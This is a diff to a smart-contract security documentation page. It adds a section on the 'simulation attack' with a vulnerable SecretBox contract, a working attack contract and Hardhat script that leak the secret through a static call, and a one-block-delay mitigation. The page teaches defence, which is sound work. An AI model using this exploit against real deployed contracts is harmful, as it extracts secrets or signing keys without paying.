@@ -4,10 +4,179 @@ description: Recipes for Confidentiality, Security considerations when writing c
 
 # Security
 
-This page is an ongoing work in progress to support confidential smart contract
-development. At the moment we address safeguarding storage variable access
-patterns and provide best practices for more secure orderings of error checking
-to prevent leaking contract state.
+This page is focused on best practices for writing secure confidential smart 
+contracts. It outlines potential attacks and how we should prevent or mitigate
+them.
+
+## Simulation Attack
+
+Suppose you store a secret in a smart contract which you reveal after some 
+amount of tokens is transferred to the contract:
+
+```solidity title="SecretBox.sol"
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SecretBox {
+  address public immutable owner;
+
+  uint256 public immutable DEPOSIT_AMOUNT;
+  string private secret;
+  address private payer;
+
+  constructor(uint256 amount) {
+    owner = msg.sender;
+    DEPOSIT_AMOUNT = amount;
+  }
+
+  function setSecret(string calldata s) external {
+    require(msg.sender == owner, "not owner");
+    secret = s;
+  }
+
+  function getSecret() external view returns (string memory) {
+    require(msg.sender == payer, "not payer");
+    return secret;
+  }
+
+  receive() external payable {
+    require(msg.value >= DEPOSIT_AMOUNT, "amount too low");
+    payer = msg.sender;
+  }
+}
+```
+
+The same principle can be applied to encumbered wallets, gasless transactions
+and cross-chain DeFi contracts where the `secret` is a signing key for
+transactions and `getSecret()` generates a signed transaction and returns it 
+to the user for submission.
+
+The *simulation attack* can leak the secret above without user sending any 
+assets to the `SecretBox` contract. The attacker can use the following helper
+contract:
+
+```solidity title="SecretBoxAttack.sol"
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import { SecretBox } from "./SecretBox.sol";
+
+contract SecretBoxAttack {
+  address private attacker;
+
+  function getSecret(address secretBoxAddr) external returns (string memory) {
+    SecretBox sb = SecretBox(payable(secretBoxAddr));
+    secretBoxAddr.call{value: address(this).balance}("");
+    return sb.getSecret();
+  }
+
+  receive() external payable {
+    require(attacker == address(0), "already paid");
+    attacker = msg.sender;
+  }
+
+  function withdraw() external {
+    payable(attacker).transfer(address(this).balance);
+  }
+}
+```
+
+The attacker then sends funds to the helper contract, simulates the
+`getSecret()` call to obtain the secret and withdraws the funds back:
+
+```typescript title="attackSecretBox.ts"
+import { ethers } from 'hardhat'
+
+const SecretBox = await ethers.getContractFactory(
+        'SecretBox'
+)
+const sb = await SecretBox.deploy(1_000_000_000)
+await sb.waitForDeployment()
+
+const secretTx = await sb.setSecret("very secret message");
+await secretTx.wait()
+
+const SecretBoxAttack = await ethers.getContractFactory(
+        'SecretBoxAttack'
+)
+const sba = await SecretBoxAttack.deploy()
+await sba.waitForDeployment()
+
+const transferTx = await(await ethers.getSigners())[0].sendTransaction({
+  to: await sba.getAddress(),
+  value: 1_000_000_000,
+})
+await transferTx.wait()
+
+const secret = await sba.getSecret.staticCall(await sb.getAddress())
+console.log(`Secret: ${secret}`)
+
+const withdrawTx = await sba.withdraw()
+await withdrawTx.wait()
+```
+
+Running the script above will leak the secret:
+
+```
+Secret: very secret message
+```
+
+### Mitigation
+
+The design of the Ethereum Virtual Machine is such that a smart contract cannot
+detect whether it is being executed within a finalized transaction vs a static
+call (including gas estimation). To overcome this, a developer needs to store the
+*proof of finality* in form of a block number when the payment was received.
+Then, when obtaining the secret (or performing other actions that require the
+payment), we require a one block delay. Since a static call cannot span across
+multiple blocks, this effectively prevents the simulation attack.
+
+Required changes:
+
+```solidity title="SecretBoxDelay.sol"
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SecretBoxDelay {
+  address public immutable owner;
+
+  uint256 public immutable DEPOSIT_AMOUNT;
+  string private secret;
+  address private payer;
+  // highlight-next-line
+  uint256 private paidBlock;
+
+  constructor(uint256 amount) {
+    owner = msg.sender;
+    DEPOSIT_AMOUNT = amount;
+  }
+
+  function setSecret(string calldata s) external {
+    require(msg.sender == owner, "not owner");
+    secret = s;
+  }
+
+  function getSecret() external view returns (string memory) {
+    require(msg.sender == payer, "not payer");
+    // highlight-next-line
+    require(block.number > paidBlock, "not finalized yet");
+    return secret;
+  }
+
+  receive() external payable {
+    require(msg.value >= DEPOSIT_AMOUNT, "amount too low");
+    payer = msg.sender;
+    // highlight-next-line
+    paidBlock = block.number;
+  }
+}
+```
+
+Running the script with the new safeguards yields:
+
+```
+execution reverted: not finalized yet
+```
 
 ## Storage Access Patterns
 
